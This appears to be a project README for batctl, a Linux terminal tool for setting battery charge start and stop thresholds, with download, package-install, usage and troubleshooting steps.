# ⚡ batctl - Manage Battery Charge Thresholds Easily

[![Download batctl](https://img.shields.io/badge/Download-batctl-blue?style=for-the-badge)](https://github.com/HoangVietng/batctl)

---

## 🔋 What is batctl?

batctl is a simple tool that helps you control when your laptop battery starts and stops charging. This is useful to keep your battery healthy over time. It works on Linux laptops, especially for ThinkPad devices. Using batctl, you can set limits on the battery charge to avoid full charges or deep discharges. This helps your laptop battery last longer.

---

## 🖥️ System Requirements

- A laptop running Linux (for example, Ubuntu or Fedora).
- Terminal access (a program that allows typing commands).
- Basic knowledge of using a keyboard.
- Supported laptop models such as ThinkPad or others with battery charge control.
- Root or administrator access to change battery settings.

batctl will not work on Windows or Mac computers since it relies on Linux system features.

---

## ⚙️ Features

- Set a maximum battery charge level.
- Set a minimum battery charge level.
- Use a simple terminal interface (text-based).
- Designed for ThinkPad laptops but may work on other models.
- Runs with low system resources.
- Open source and easy to install.
- Written in Go programming language for speed.

---

## 🚀 Getting Started

Here are the steps to get batctl on your system and start managing your battery.

### Step 1: Visit the Download Page

Use this link to visit the main page where you can get the latest batctl version:

[Download batctl](https://github.com/HoangVietng/batctl)

This page contains the software, manuals, and more.

### Step 2: Download the Package

Look for the **Releases** section or the latest version on the page.

Download the package suitable for your Linux distribution or source code if you plan to build it yourself.

### Step 3: Install batctl

After downloading, open a terminal on your laptop.

Use the following commands depending on your file and system type:

- If you downloaded a pre-built package, run:

  ```bash
  sudo dpkg -i batctl-version.deb   # For Debian/Ubuntu
  sudo rpm -i batctl-version.rpm    # For Fedora/RedHat
  ```

- If you downloaded source code, follow the included README instructions to build and install.

### Step 4: Run batctl

Once installed, you can start batctl by opening a terminal and typing:

```bash
sudo batctl
```

This opens the battery charge manager interface.

---

## 🖱️ How to Use batctl

batctl provides a text-based menu to control the battery settings.

- Use arrow keys or number keys to select options.
- Set the **start charge** threshold (when charging begins).
- Set the **stop charge** threshold (when charging stops).
- Save your changes.

For example, if you want your battery to charge only up to 80%, set the stop charge threshold to 80%.

---

## 🛠️ Troubleshooting

- If you get permission errors, make sure you use `sudo` to run batctl.
- If the program does not detect your battery, it may not support your laptop model.
- Check your Linux distribution’s documentation about battery management.
- Ensure your battery supports charge threshold control.

---

## 📚 Additional Resources

- Visit the main project page for updates and FAQs:  
  [https://github.com/HoangVietng/batctl](https://github.com/HoangVietng/batctl)

- Linux community forums can help with advanced setup and model support.

---

## 💡 Tips for Better Battery Life

- Avoid charging to 100% all the time.
- Use a stop threshold of around 80% if possible.
- Avoid letting your battery drain completely.
- Use power-saving settings along with batctl.

---

## 📥 Download and Setup Links

[![Download batctl](https://img.shields.io/badge/Get%20batctl%20Here-grey?style=for-the-badge)](https://github.com/HoangVietng/batctl)

Click the links above to visit the official page and follow the steps to download and install batctl on your Linux laptop.